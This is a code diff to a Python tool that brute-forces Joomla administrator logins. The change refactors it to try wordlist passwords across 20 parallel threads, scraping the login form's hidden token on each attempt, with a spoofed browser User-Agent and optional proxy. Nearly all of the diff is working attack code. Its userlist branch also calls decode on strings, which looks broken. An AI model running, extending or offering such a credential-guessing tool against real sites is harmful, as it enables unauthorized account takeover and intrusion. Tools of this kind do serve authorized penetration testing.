@@ -6,7 +6,59 @@ from urllib.parse import urlparse
 from rich import print
 from rich.progress import track
 import sys
-# remove userlist
+from concurrent.futures import ThreadPoolExecutor
+from threading import Lock
+
+def get_data(path):
+    return list(map(lambda x: x.strip(), open(path).readlines()))
+
+print_lock = Lock()
+
+def try_password(args):
+    password, current_username, admin_url, proxy_dict, cookies, option, task, ret, verbose = args
+    headers = { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0"}
+
+    r = requests.get(admin_url, proxies=proxy_dict, cookies=cookies, headers=headers)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
+
+    data = {
+        'username': current_username,
+        'passwd': password,
+        'option': option,
+        'task': task,
+        'return': ret,
+        longstring: 1
+    }
+    
+    r = requests.post(admin_url, data=data, proxies=proxy_dict, cookies=cookies, headers=headers)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    response = soup.find('div', {'class': 'alert-message'})        
+
+    if response:
+        if verbose:
+            with print_lock:
+                print(f"[red]Failed: {current_username}:{password}[/red]")
+        return False
+    else:
+        with print_lock:
+            print(f"\n[green]Success! {current_username}:{password}[/green]")
+        return True
+
+def try_login(current_username, admin_url, proxy_dict, cookies, option, task, ret, verbose, wordlist):
+    print(f"[blue]Starting bruteforce for username: {current_username}[/blue]")
+    passwords = get_data(wordlist)
+    total_passwords = len(passwords)
+    print(f"[blue]Loaded {total_passwords} passwords from wordlist[/blue]")
+
+    args_list = [(password, current_username, admin_url, proxy_dict, cookies, option, task, ret, verbose) 
+                 for password in passwords]
+    
+    with ThreadPoolExecutor(max_workers=20) as executor:
+        results = list(executor.map(try_password, args_list))
+        
+    return True in results
+
 def joomla_brute(url: str, wordlist: str, username: str = None, userlist: str = None, proxy: str = None, verbose: bool = False):
     """
     Perform Joomla login bruteforce attack
@@ -39,51 +91,10 @@ def joomla_brute(url: str, wordlist: str, username: str = None, userlist: str = 
     cookies = requests.session().get(admin_url).cookies.get_dict()
     print("[green]Successfully connected to target[/green]")
 
-
-    def get_data(path):
-        return list(map(lambda x: x.strip(), open(path).readlines()))
-    
     if userlist:
         users = get_data(userlist)
         for user in users:
-            if try_login(user.decode('utf-8')):
+            if try_login(user.decode('utf-8'), admin_url, proxy_dict, cookies, option, task, ret, verbose, wordlist):
                 break
     else:
-        try_login(username)
-
-
-def try_login(current_username):
-    print(f"[blue]Starting bruteforce for username: {current_username}[/blue]")
-    # read from file instead
-    passwords = get_data(wordlist)
-    total_passwords = len(passwords)
-    print(f"[blue]Loaded {total_passwords} passwords from wordlist[/blue]")
-
-
-    for password in track(passwords):
-        headers = { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0"}
-
-        r = requests.get(admin_url, proxies=proxy_dict, cookies=cookies, headers=headers)
-        soup = BeautifulSoup(r.text, 'html.parser')
-        longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
-        password = password.decode('utf-8')
-
-        data = {
-            'username': current_username,
-            'passwd': password,
-            'option': option,
-            'task': task,
-            'return': ret,
-            longstring: 1
-        }
-        
-        r = requests.post(admin_url, data=data, proxies=proxy_dict, cookies=cookies, headers=headers)
-        soup = BeautifulSoup(r.text, 'html.parser')
-        response = soup.find('div', {'class': 'alert-message'})        
-        print(r.text)            
-        if response:
-            if verbose:
-                print(f"[red]Failed: {current_username}:{password}[/red]")
-        else:
-            print(f"\n[green]Success! {current_username}:{password}[/green]")
-            break
+        try_login(username, admin_url, proxy_dict, cookies, option, task, ret, verbose, wordlist)
